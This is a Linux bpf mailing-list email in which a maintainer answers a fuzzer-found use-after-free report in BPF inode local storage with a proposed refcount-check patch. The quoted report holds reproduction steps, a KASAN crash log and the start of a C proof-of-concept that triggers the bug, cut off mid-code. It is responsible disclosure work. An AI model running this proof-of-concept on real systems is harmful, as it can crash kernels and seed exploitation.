Return-Path: <bpf+bounces-75795-lists+bpf=lfdr.de@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from dfw.mirrors.kernel.org (dfw.mirrors.kernel.org [IPv6:2605:f480:58:1:0:1994:3:14])
	by mail.lfdr.de (Postfix) with ESMTPS id E821CC95F0F
	for <lists+bpf@lfdr.de>; Mon, 01 Dec 2025 08:03:30 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by dfw.mirrors.kernel.org (Postfix) with ESMTPS id 254134E1436
	for <lists+bpf@lfdr.de>; Mon,  1 Dec 2025 07:03:27 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id C941C2882A8;
	Mon,  1 Dec 2025 07:03:22 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="HpOjutv/"
X-Original-To: bpf@vger.kernel.org
Received: from mail-yw1-f182.google.com (mail-yw1-f182.google.com [209.85.128.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E51C4285C98
	for <bpf@vger.kernel.org>; Mon,  1 Dec 2025 07:03:19 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.182
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1764572602; cv=none; b=FGPCVuKNo+dW+LbyBBaWmizmcr/NmDlkH47RrjhexjuecCoRKvQBxqL+AmyAd+53Cae7Gt150gExkrmWxk+b5x3SwuQvFl0OawFCY7Jvpw3L6kFlfhqL/XiY+EPRQBaeJ9sWNnoJbEjB437ioFUAUjqnXaMfpK6meSU8Fo+jhdE=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1764572602; c=relaxed/simple;
	bh=iRknDmzLlvqYWV+PFdJDA6fj3TCqAWTB7eT+7qGajYg=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=q6Xb+jFQZ9dTFASdSwjU8+Ujt2eUkIP5CyeZ+27jVgno3skjKDPh7b2XgbBDWIiskday1A4q5YjUeMQupcTg+l77XT9a+alovZrrUmoPfc6OmQbm448JLDsFXT+uWhyNZBG8w56EsH2zuFLp7gQ9Q/UCw8PDVeFxQKMRz1LAHZA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=HpOjutv/; arc=none smtp.client-ip=209.85.128.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-yw1-f182.google.com with SMTP id 00721157ae682-786635a8ce4so26550427b3.2
        for <bpf@vger.kernel.org>; Sun, 30 Nov 2025 23:03:19 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1764572599; x=1765177399; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=8QwtnfQHmF7gx2gV89ngdpRssrFbFSLRulW2+PDqFR4=;
        b=HpOjutv/BtVzlT4FGGSIswZU9je2IEaJVeS+JdZG+grKEpknKuhWrb7ahpVn0OGETa
         +UnA72ECwa5ePrOYow5j8fj27GShbtpDobOK2bCx2mbh42r+/0K4+uhtbo/ZhZDSp5sA
         3BlDm6nt+lNxDETKkTdoXMYo2ivnVVKISnMh5irfdWfhjger5hsub1enUJc29nb18iIZ
         O7PudocyRQa5fGg6GlWvj67M97EuUpq1Vn8SlceftazfgxEN2WMACVAGEVuHbhXxX3ep
         w7tJ2vG/nDg0L5ESO1WYWl1Or5xEtBJaEkEsf80b2LdSRi0gocqwBI5ohB5teT3ouiFJ
         5YvA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1764572599; x=1765177399;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=8QwtnfQHmF7gx2gV89ngdpRssrFbFSLRulW2+PDqFR4=;
        b=Bqfpybmi9rcfhSI2GSEjZnrsFIAvrMlnxu0tQwfYiBMOC9G0T2XCvm6gfiehkmcXtS
         VWC73XzTWUPw/7G8oQ+4K+1WoH0xQTL3oQNZJl9Hra0JMkYdgC8F8NUwaK4ES8vU41Zc
         jvHMPC22YlpnvOGZHQ7T5RYIUyPe/N0egDE97Mlj2BQIb2Zc+od2zqZAxGLY8D+F+3S2
         JxT8XKuIpthz67gzTpH9PrG1EGTBL6H+6mqmS2miA8Kfssh3cTpg9ctwPl0QQ/y6pmKE
         CboxtHzKqHYInLWTYZX16EKDicxm7MSr2KEFGTkjm+5wKU4BjdGplqWRZqNquR1Mnmca
         1ngg==
X-Forwarded-Encrypted: i=1; AJvYcCXpbKRj3yb80E66KHsWZbwLYzcYWYGtUGo0LmdpkQzZoW4NHl4LytXjpd+CENUGwnRw2ZI=@vger.kernel.org
X-Gm-Message-State: AOJu0YwriDzOTNKZkDsGk/3QORJuIpJtW+Zty/ytTqmmOpOWWwraSL5h
	b4yuqQsTBoBsy8gBWMo/5QLrwuEqeZ4veDGTwRotTKspsbB/+hSnT0SQgcPbPpRkCnVbLfbbIXu
	+d92ncqA7IghlX8A/8eFTlQpV2Au7FKG4iCuB
X-Gm-Gg: ASbGnctSjipXZ2lYleO1Nyil1u7DEcPosRTBKGZjZtWE6NwdSEjiu5YyaLDWDfDM6Iz
	7iy1IJBbOqtLSjUqQAD2chGCspaIzXfL/ZYNrhgBKa1blY+isPOm55nmGnN61tIzee/u4jh++Gw
	1rVz66tGL233ZaYmdm2TRvIvnIlvgTzraGXdTkeE6xCV6dwfMhG9QSHnu14nC36PJ7RtF6PkUbk
	tUm3weh3divZWazJ84oLhyHUP94iSeYEUA2WvN5Z1W4K0gH1HvDuNaqpqFliXj75JRJcQM=
X-Google-Smtp-Source: AGHT+IFBsP94j9uZerH3j2fLmhZLSNH+11rieuZtJK1UgVieYDke9uUFvAEhXScNk6kTRUL2Rkafpr4oC+kMmGlNI+w=
X-Received: by 2002:a05:690c:4b05:b0:787:1aba:30b4 with SMTP id
 00721157ae682-78a8b555c0dmr331441917b3.54.1764572598557; Sun, 30 Nov 2025
 23:03:18 -0800 (PST)
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <44f2b634.4a2b9.19ad8756ca3.Coremail.kaiyanm@hust.edu.cn>
In-Reply-To: <44f2b634.4a2b9.19ad8756ca3.Coremail.kaiyanm@hust.edu.cn>
From: Amery Hung <ameryhung@gmail.com>
Date: Sun, 30 Nov 2025 23:03:07 -0800
X-Gm-Features: AWmQ_bkNuSae5sjVgHN6rs_nb67RIheFWRdb7qzniiRDK0-OMmXC2YgVKDeZ3Cs
Message-ID: <CAMB2axOySqp07ErmgaDysHPYJf5zvoNO12H2yxyu3dkOo9-tFA@mail.gmail.com>
Subject: Re: bpf: Use-after-free in inode local storage due to premature
 i_security freeing
To: =?UTF-8?B?5qKF5byA5b2m?= <kaiyanm@hust.edu.cn>
Cc: daniel@iogearbox.net, bpf@vger.kernel.org, martin.lau@linux.dev, 
	hust-os-kernel-patches@googlegroups.com, dddddd@hust.edu.cn, 
	dzm91@hust.edu.cn
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Sun, Nov 30, 2025 at 9:51=E2=80=AFPM =E6=A2=85=E5=BC=80=E5=BD=A6 <kaiyan=
m@hust.edu.cn> wrote:
>
> Our fuzzer tool discovered a use-after-free vulnerability in the BPF subs=
ystem related to inode local storage. The flaw is caused by incorrect objec=
t lifetime management between the destruction of an inode's security blob (=
`i_security`) and the cleanup of a BPF map that holds a reference to that i=
node's storage.
>
> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
>
> ## Root Cause
>
> The use-after-free is caused by the premature freeing of an inode's secur=
ity blob `i_security`. This happens because the BPF local storage subsystem=
 incorrectly manages the inode's object lifecycle, leading to a situation w=
here the `i_security` memory is released while the BPF map still holds a da=
ngling pointer to it. The sequence of events is as follows:
>
> 1.  The `close()` syscall initiates the `__fput()` kernel function. The i=
mplementation of `__fput` calls `dput()` before `file_free()`.
> 2.  The call to `dput()` leads to `security_inode_free()`, which schedule=
s the `inode->i_security` memory blob to be freed after an RCU grace period=
 by using `call_rcu()`. At this moment, the memory is not yet freed, but is=
 "pending free".
> 3.  Later in the same `__fput()` execution, `file_free()` is called, trig=
gering the attached BPF LSM program at the `security_file_free` hook.
> 4.  The BPF program calls `bpf_inode_storage_get()`. Because the RCU grac=
e period has not ended, the `inode->i_security` pointer is still valid. The=
 helper function successfully creates an association between the `inode` an=
d a BPF local storage element.
> 5.  Shortly after the `close()` call returns, the RCU grace period finish=
es. The kernel executes the deferred free callback, and the `i_security` me=
mory is actually freed. From this point on, the BPF map's element contains =
a dangling reference.
> 6.  Upon process termination, the BPF map's file descriptor is closed. Th=
e kernel schedules a worker thread (`bpf_map_free_deferred`) to clean up th=
e map. This cleanup code attempts to access the now-freed `i_security` blob=
 via the `bpf_inode()` function, resulting in a use-after-free.
>
>
> ### Execution Flow Visualization
>
> ```c
> Vulnerability Execution Flow
> |
> |--- 1. `close(sock)` Syscall Execution
> |    |
> |    `-- __fput()
> |        |
> |        |--> dput() -> ... -> destroy_inode()
> |        |    |
> |        |    `-- security_inode_free(inode)
> |        |        |
> |        |        `-- call_rcu(inode->i_security, inode_free_by_rcu)
> |        |            |
> |        |            `-> State: inode->i_security is now "pending free".
> |        |               The pointer is valid, but the memory is schedule=
d for freeing.
> |        |
> |        `--> file_free()
> |            |
> |            `-- security_file_free()  // BPF program hook
> |                |
> |                `-- bpf_inode_storage_get()
> |                    |
> |                    `-> State: Successfully associates local_storage wit=
h the inode because
> |                        inode->i_security is still valid. A storage elem=
ent now exists
> |                        in the BPF map pointing to this inode.
> |
> |--- 2. RCU Grace Period Ends (shortly after `close()` returns)
> |    |
> |    `-- inode_free_by_rcu() is executed by a kernel callback
> |        |
> |        `-- kmem_cache_free(inode->i_security)
> |            |
> |            `-> State: inode->i_security memory is now freed.
> |               The BPF map's storage element now contains a dangling poi=
nter.
> |
> |--- 3. Process Exit & Map Cleanup
>      |
>      `-- bpf_map_free_deferred() -> ...
>          |
>          |-- bpf_selem_unlink_storage_nolock()
>          |   |
>          |   `-- inode_storage_ptr(inode)
>          |       |
>          |       `-- bpf_inode(inode)
>          |           |
>          |           `-- Accesses inode->i_security
>          |               |
>          |               `-> CRASH: Use-after-free occurs here.
>
> ```

Thanks for reporting. I've thought of this scenario when looking at
the inode local storage code and this confirms it .

cgroup and task already checks the refcount of the owner before
actually creating a local storage (i.e., they skip if refcount =3D=3D 0),
so we should probably do the same thing for inode like below (not
tested):

@@ -149,7 +149,8 @@ BPF_CALL_5(bpf_inode_storage_get, struct bpf_map
*, map, struct inode *, inode,
        /* This helper must only called from where the inode is guaranteed
         * to have a refcount and cannot be freed.
         */
-       if (flags & BPF_LOCAL_STORAGE_GET_F_CREATE) {
+       if (icount_read(inode) &&
+           flags & BPF_LOCAL_STORAGE_GET_F_CREATE) {
                sdata =3D bpf_local_storage_update(
                        inode, (struct bpf_local_storage_map *)map, value,
                        BPF_NOEXIST, false, gfp_flags);

I will test it and submit a patch tomorrow.

>
> ## Reproduction Steps
>
> 1.  **Map Creation**: Create a BPF map of type `BPF_MAP_TYPE_INODE_STORAG=
E`.
> 2.  **Program Setup**: Load a `BPF_PROG_TYPE_LSM` BPF program. The progra=
m should be written to call the `bpf_inode_storage_get()` helper.
> 3.  **Link Creation**: Attach the LSM program specifically to the `bpf_ls=
m_file_free_security` hook via its BTF ID.
> 4.  **Trigger**: Create and immediately close a socket. The sequence of k=
ernel operations during the `close()` call will create the condition for th=
e UAF. The UAF itself will be detected by KASAN when the process exits and =
the map is garbage-collected.
>
>
> ## KASAN Report
>
> ```
> [ 5498.067839][T10012] BUG: KASAN: slab-use-after-free in inode_storage_p=
tr+0x93/0xa0
> [ 5498.068151][T10012] Read of size 8 at addr ffff8881263bc5f8 by task kw=
orker/u10:2/10012
> [ 5498.068475][T10012]
> [ 5498.068581][T10012] CPU: 1 UID: 0 PID: 10012 Comm: kworker/u10:2 Not t=
ainted 6.18.0-rc7-next-20251128 #9 PREEMPT(full)
> [ 5498.068588][T10012] Hardware name: QEMU Standard PC (i440FX + PIIX, 19=
96), BIOS 1.15.0-1 04/01/2014
> [ 5498.068592][T10012] Workqueue: events_unbound bpf_map_free_deferred
> [ 5498.068605][T10012] Call Trace:
> [ 5498.068610][T10012]  <TASK>
> [ 5498.068614][T10012]  dump_stack_lvl+0x116/0x1b0
> [ 5498.068628][T10012]  print_report+0xca/0x5f0
> [ 5498.068640][T10012]  ? __phys_addr+0xf0/0x180
> [ 5498.068650][T10012]  ? inode_storage_ptr+0x93/0xa0
> [ 5498.068656][T10012]  ? inode_storage_ptr+0x93/0xa0
> [ 5498.068663][T10012]  kasan_report+0xca/0x100
> [ 5498.068686][T10012]  ? inode_storage_ptr+0x93/0xa0
> [ 5498.068694][T10012]  inode_storage_ptr+0x93/0xa0
> [ 5498.068701][T10012]  bpf_selem_unlink_storage_nolock+0x5ca/0x7c0
> [ 5498.068709][T10012]  bpf_selem_unlink_storage+0x136/0x370
> [ 5498.068716][T10012]  ? __pfx_bpf_selem_unlink_storage+0x10/0x10
> [ 5498.068722][T10012]  ? lockdep_hardirqs_on+0x7c/0x110
> [ 5498.068730][T10012]  ? _raw_spin_unlock_irqrestore+0x46/0x80
> [ 5498.068738][T10012]  ? bpf_local_storage_map_free+0x1d3/0x630
> [ 5498.068745][T10012]  bpf_local_storage_map_free+0x3d2/0x630
> [ 5498.068759][T10012]  bpf_map_free_deferred+0x2e5/0x810
> [ 5498.068767][T10012]  process_one_work+0x997/0x1b00
> [ 5498.068778][T10012]  ? __pfx_process_one_work+0x10/0x10
> [ 5498.068787][T10012]  ? assign_work+0x19b/0x250
> [ 5498.068794][T10012]  worker_thread+0x683/0xe90
> [ 5498.068803][T10012]  ? __pfx_worker_thread+0x10/0x10
> [ 5498.068811][T10012]  kthread+0x3d5/0x780
> [ 5498.068817][T10012]  ? __pfx_kthread+0x10/0x10
> [ 5498.068824][T10012]  ? _raw_spin_unlock_irq+0x28/0x50
> [ 5498.068830][T10012]  ? __pfx_kthread+0x10/0x10
> [ 5498.068837][T10012]  ret_from_fork+0x96b/0xaf0
> [ 5498.068844][T10012]  ? __pfx_ret_from_fork+0x10/0x10
> [ 5498.068850][T10012]  ? __pfx_kthread+0x10/0x10
> [ 5498.068856][T10012]  ? __switch_to+0x76c/0x10d0
> [ 5498.068865][T10012]  ? __pfx_kthread+0x10/0x10
> [ 5498.068872][T10012]  ret_from_fork_asm+0x1a/0x30
> [ 5498.068884][T10012]  </TASK>
> [ 5498.068886][T10012]
> [ 5498.076497][T10012] Allocated by task 10052:
> [ 5498.076678][T10012]  kasan_save_stack+0x24/0x50
> [ 5498.076871][T10012]  kasan_save_track+0x14/0x30
> [ 5498.077064][T10012]  __kasan_slab_alloc+0x87/0x90
> [ 5498.077263][T10012]  kmem_cache_alloc_lru_noprof+0x294/0x840
> [ 5498.077505][T10012]  sock_alloc_inode+0x2c/0x1e0
> [ 5498.077702][T10012]  alloc_inode+0x6d/0x250
> [ 5498.077881][T10012]  sock_alloc+0x45/0x280
> [ 5498.078057][T10012]  __sock_create+0xc6/0x8e0
> [ 5498.078241][T10012]  __sys_socket+0x14a/0x2e0
> [ 5498.078425][T10012]  __x64_sys_socket+0x77/0xc0
> [ 5498.078617][T10012]  do_syscall_64+0xcb/0xf80
> [ 5498.078804][T10012]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [ 5498.079044][T10012]
> [ 5498.079141][T10012] Freed by task 23:
> [ 5498.079299][T10012]  kasan_save_stack+0x24/0x50
> [ 5498.079494][T10012]  kasan_save_track+0x14/0x30
> [ 5498.079686][T10012]  kasan_save_free_info+0x3b/0x60
> [ 5498.079890][T10012]  __kasan_slab_free+0x61/0x80
> [ 5498.080097][T10012]  kmem_cache_free+0x164/0x780
> [ 5498.080293][T10012]  i_callback+0x4b/0x80
> [ 5498.080465][T10012]  rcu_core+0x7a6/0x1510
> [ 5498.080646][T10012]  handle_softirqs+0x1d9/0x840
> [ 5498.080842][T10012]  run_ksoftirqd+0x3f/0x70
> [ 5498.081027][T10012]  smpboot_thread_fn+0x3d9/0xab0
> [ 5498.081228][T10012]  kthread+0x3d5/0x780
> [ 5498.081396][T10012]  ret_from_fork+0x96b/0xaf0
> [ 5498.081582][T10012]  ret_from_fork_asm+0x1a/0x30
> [ 5498.081781][T10012]
> [ 5498.081877][T10012] Last potentially related work creation:
> [ 5498.082104][T10012]  kasan_save_stack+0x24/0x50
> [ 5498.082297][T10012]  kasan_record_aux_stack+0xa7/0xc0
> [ 5498.082510][T10012]  __call_rcu_common.constprop.0+0xa9/0xa10
> [ 5498.082752][T10012]  destroy_inode+0x131/0x1b0
> [ 5498.082940][T10012]  evict+0x579/0xa90
> [ 5498.083100][T10012]  iput.part.0+0x7f9/0xf10
> [ 5498.083281][T10012]  iput+0x3a/0x40
> [ 5498.083432][T10012]  dentry_unlink_inode+0x29b/0x480
> [ 5498.083626][T10012]  __dentry_kill+0x1d7/0x600
> [ 5498.083814][T10012]  finish_dput+0x7a/0x460
> [ 5498.083990][T10012]  dput.part.0+0x456/0x570
> [ 5498.084172][T10012]  dput+0x24/0x30
> [ 5498.084322][T10012]  __fput+0x51b/0xb50
> [ 5498.084486][T10012]  fput_close_sync+0x114/0x210
> [ 5498.084683][T10012]  __x64_sys_close+0x93/0x120
> [ 5498.084876][T10012]  do_syscall_64+0xcb/0xf80
> [ 5498.085065][T10012]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [ 5498.085304][T10012]
> [ 5498.085401][T10012] The buggy address belongs to the object at ffff888=
1263bc500
> [ 5498.085401][T10012]  which belongs to the cache sock_inode_cache of si=
ze 1344
> [ 5498.085974][T10012] The buggy address is located 248 bytes inside of
> [ 5498.085974][T10012]  freed 1344-byte region [ffff8881263bc500, ffff888=
1263bca40)
> [ 5498.086519][T10012]
> [ 5498.086617][T10012] The buggy address belongs to the physical page:
> [ 5498.086874][T10012] page: refcount:0 mapcount:0 mapping:00000000000000=
00 index:0xffff8881263b8000 pfn:0x1263b8
> [ 5498.087278][T10012] head: order:3 mapcount:0 entire_mapcount:0 nr_page=
s_mapped:0 pincount:0
> [ 5498.087616][T10012] memcg:ffff8881065e4301
> [ 5498.087786][T10012] flags: 0x57ff00000000040(head|node=3D1|zone=3D2|la=
stcpupid=3D0x7ff)
> [ 5498.088094][T10012] page_type: f5(slab)
> [ 5498.088259][T10012] raw: 057ff00000000040 ffff888100eaa000 dead0000000=
00122 0000000000000000
> [ 5498.088601][T10012] raw: ffff8881263b8000 0000000080160011 00000000f50=
00000 ffff8881065e4301
> [ 5498.088943][T10012] head: 057ff00000000040 ffff888100eaa000 dead000000=
000122 0000000000000000
> [ 5498.089288][T10012] head: ffff8881263b8000 0000000080160011 00000000f5=
000000 ffff8881065e4301
> [ 5498.089634][T10012] head: 057ff00000000003 ffffea000498ee01 00000000ff=
ffffff 00000000ffffffff
> [ 5498.089979][T10012] head: ffffffffffffffff 0000000000000000 00000000ff=
ffffff 0000000000000008
> [ 5498.090321][T10012] page dumped because: kasan: bad access detected
> [ 5498.090580][T10012] page_owner tracks the page as allocated
> [ 5498.090806][T10012] page last allocated via order 3, migratetype Recla=
imable, gfp_mask 0xd20d0(__GFP_RECLAIMABLE|__GFP_IO|__GFP_FS|__GFP_NOWARN|_=
_GFP_NORETR0
> [ 5498.091672][T10012]  post_alloc_hook+0x1ca/0x240
> [ 5498.091868][T10012]  get_page_from_freelist+0xdb8/0x2a70
> [ 5498.092089][T10012]  __alloc_frozen_pages_noprof+0x25b/0x20f0
> [ 5498.092328][T10012]  alloc_pages_mpol+0x1f6/0x550
> [ 5498.092530][T10012]  new_slab+0x2d5/0x440
> [ 5498.092700][T10012]  ___slab_alloc+0xde1/0x1bd0
> [ 5498.092890][T10012]  __slab_alloc.constprop.0+0x6b/0x120
> [ 5498.093113][T10012]  kmem_cache_alloc_lru_noprof+0x518/0x840
> [ 5498.093348][T10012]  sock_alloc_inode+0x2c/0x1e0
> [ 5498.093546][T10012]  alloc_inode+0x6d/0x250
> [ 5498.093723][T10012]  sock_alloc+0x45/0x280
> [ 5498.093899][T10012]  __sock_create+0xc6/0x8e0
> [ 5498.094082][T10012]  __sys_socket+0x14a/0x2e0
> [ 5498.094266][T10012]  __x64_sys_socket+0x77/0xc0
> [ 5498.094457][T10012]  do_syscall_64+0xcb/0xf80
> [ 5498.094645][T10012]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [ 5498.094884][T10012] page_owner free stack trace missing
> [ 5498.095098][T10012]
> [ 5498.095195][T10012] Memory state around the buggy address:
> [ 5498.095420][T10012]  ffff8881263bc480: fc fc fc fc fc fc fc fc fc fc f=
c fc fc fc fc fc
> [ 5498.095741][T10012]  ffff8881263bc500: fa fb fb fb fb fb fb fb fb fb f=
b fb fb fb fb fb
> [ 5498.096061][T10012] >ffff8881263bc580: fb fb fb fb fb fb fb fb fb fb f=
b fb fb fb fb fb
> [ 5498.096380][T10012]                                                   =
              ^
> [ 5498.096695][T10012]  ffff8881263bc600: fb fb fb fb fb fb fb fb fb fb f=
b fb fb fb fb fb
> [ 5498.097013][T10012]  ffff8881263bc680: fb fb fb fb fb fb fb fb fb fb f=
b fb fb fb fb fb
> [ 5498.097331][T10012] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> [ 5498.097651][T10012] Kernel panic - not syncing: KASAN: panic_on_warn s=
et ...
> [ 5498.097940][T10012] CPU: 1 UID: 0 PID: 10012 Comm: kworker/u10:2 Not t=
ainted 6.18.0-rc7-next-20251128 #9 PREEMPT(full)
> [ 5498.098372][T10012] Hardware name: QEMU Standard PC (i440FX + PIIX, 19=
96), BIOS 1.15.0-1 04/01/2014
> [ 5498.098738][T10012] Workqueue: events_unbound bpf_map_free_deferred
> [ 5498.099001][T10012] Call Trace:
> [ 5498.099137][T10012]  <TASK>
> [ 5498.099259][T10012]  dump_stack_lvl+0x3d/0x1b0
> [ 5498.099453][T10012]  vpanic+0x67e/0x710
> [ 5498.099621][T10012]  panic+0xc7/0xd0
> [ 5498.099776][T10012]  ? __pfx_panic+0x10/0x10
> [ 5498.099958][T10012]  ? end_report+0x4c/0x160
> [ 5498.100142][T10012]  ? rcu_is_watching+0x12/0xc0
> [ 5498.100337][T10012]  ? lock_release+0x1fc/0x2d0
> [ 5498.100531][T10012]  ? check_panic_on_warn+0x24/0xc0
> [ 5498.100740][T10012]  ? inode_storage_ptr+0x93/0xa0
> [ 5498.100943][T10012]  check_panic_on_warn+0xb6/0xc0
> [ 5498.101145][T10012]  ? inode_storage_ptr+0x93/0xa0
> [ 5498.101347][T10012]  end_report+0x107/0x160
> [ 5498.101529][T10012]  kasan_report+0xd8/0x100
> [ 5498.101714][T10012]  ? inode_storage_ptr+0x93/0xa0
> [ 5498.101920][T10012]  inode_storage_ptr+0x93/0xa0
> [ 5498.102127][T10012]  bpf_selem_unlink_storage_nolock+0x5ca/0x7c0
> [ 5498.102379][T10012]  bpf_selem_unlink_storage+0x136/0x370
> [ 5498.102606][T10012]  ? __pfx_bpf_selem_unlink_storage+0x10/0x10
> [ 5498.102852][T10012]  ? lockdep_hardirqs_on+0x7c/0x110
> [ 5498.103064][T10012]  ? _raw_spin_unlock_irqrestore+0x46/0x80
> [ 5498.103301][T10012]  ? bpf_local_storage_map_free+0x1d3/0x630
> [ 5498.103542][T10012]  bpf_local_storage_map_free+0x3d2/0x630
> [ 5498.103777][T10012]  bpf_map_free_deferred+0x2e5/0x810
> [ 5498.103994][T10012]  process_one_work+0x997/0x1b00
> [ 5498.104209][T10012]  ? __pfx_process_one_work+0x10/0x10
> [ 5498.104431][T10012]  ? assign_work+0x19b/0x250
> [ 5498.104622][T10012]  worker_thread+0x683/0xe90
> [ 5498.104813][T10012]  ? __pfx_worker_thread+0x10/0x10
> [ 5498.105024][T10012]  kthread+0x3d5/0x780
> [ 5498.105193][T10012]  ? __pfx_kthread+0x10/0x10
> [ 5498.105382][T10012]  ? _raw_spin_unlock_irq+0x28/0x50
> [ 5498.105595][T10012]  ? __pfx_kthread+0x10/0x10
> [ 5498.105784][T10012]  ret_from_fork+0x96b/0xaf0
> [ 5498.105975][T10012]  ? __pfx_ret_from_fork+0x10/0x10
> [ 5498.106184][T10012]  ? __pfx_kthread+0x10/0x10
> [ 5498.106373][T10012]  ? __switch_to+0x76c/0x10d0
> [ 5498.106569][T10012]  ? __pfx_kthread+0x10/0x10
> [ 5498.106760][T10012]  ret_from_fork_asm+0x1a/0x30
> [ 5498.106961][T10012]  </TASK>
> [ 5498.107386][T10012] Kernel Offset: disabled
> ```
>
> ## Proof of Concept
>
> The following C program can demonstrate the vulnerability on linux-next-2=
0251128(commit 7d31f578f3230f3b7b33b0930b08f9afd8429817).
>
> To successfully run the PoC, you need to obtain the BTF ID for `bpf_lsm_f=
ile_free_security` and set the variable `btf_id` in function `load_prog` to=
 this value. You can retrieve this BTF ID using the following command: `bpf=
tool btf dump file path-to-your-vmlinux | grep bpf_lsm_file_free_security`.
>
> ```c
> #define _GNU_SOURCE
>
> #include <dirent.h>
> #include <endian.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <signal.h>
> #include <stdarg.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/prctl.h>
> #include <sys/stat.h>
> #include <sys/syscall.h>
> #include <sys/types.h>
> #include <sys/wait.h>
> #include <sys/ioctl.h>
> #include <time.h>
> #include <unistd.h>
> #include <linux/bpf.h>
> #include <sys/socket.h>
>
> #ifndef __NR_bpf
> #define __NR_bpf 321
> #endif
>
> #define BPF_FUNC_inode_storage_get 145
> #define BPF_FUNC_inode_storage_delete 146
>
> #define BPF_EXIT_INSN()                                         \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_JMP | BPF_EXIT,                    \
>                 .dst_reg =3D 0,                                   \
>                 .src_reg =3D 0,                                   \
>                 .off   =3D 0,                                     \
>                 .imm   =3D 0 })
>
> #define BPF_MOV64_IMM(DST, IMM)                                 \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_ALU64 | BPF_MOV | BPF_K,           \
>                 .dst_reg =3D DST,                                 \
>                 .src_reg =3D 0,                                   \
>                 .off   =3D 0,                                     \
>                 .imm   =3D IMM })
>
> #define BPF_LDX_MEM(SIZE, DST, SRC, OFF)                        \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
>                 .dst_reg =3D DST,                                 \
>                 .src_reg =3D SRC,                                 \
>                 .off   =3D OFF,                                   \
>                 .imm   =3D 0 })
>
> #define BPF_LD_IMM64_RAW_FULL(DST, SRC, OFF1, OFF2, IMM1, IMM2) \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_LD | BPF_DW | BPF_IMM,             \
>                 .dst_reg =3D DST,                                 \
>                 .src_reg =3D SRC,                                 \
>                 .off   =3D OFF1,                                  \
>                 .imm   =3D IMM1 }),                               \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D 0, /* zero is reserved opcode */       \
>                 .dst_reg =3D 0,                                   \
>                 .src_reg =3D 0,                                   \
>                 .off   =3D OFF2,                                  \
>                 .imm   =3D IMM2 })
>
> /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */
>
> #define BPF_LD_MAP_FD(DST, MAP_FD)                              \
>         BPF_LD_IMM64_RAW_FULL(DST, BPF_PSEUDO_MAP_FD, 0, 0,     \
>                               MAP_FD, 0)
>
> #define BPF_MOV64_REG(DST, SRC)                                 \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_ALU64 | BPF_MOV | BPF_X,           \
>                 .dst_reg =3D DST,                                 \
>                 .src_reg =3D SRC,                                 \
>                 .off   =3D 0,                                     \
>                 .imm   =3D 0 })
>
> #define BPF_EMIT_CALL(FUNC)                                     \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_JMP | BPF_CALL,                    \
>                 .dst_reg =3D 0,                                   \
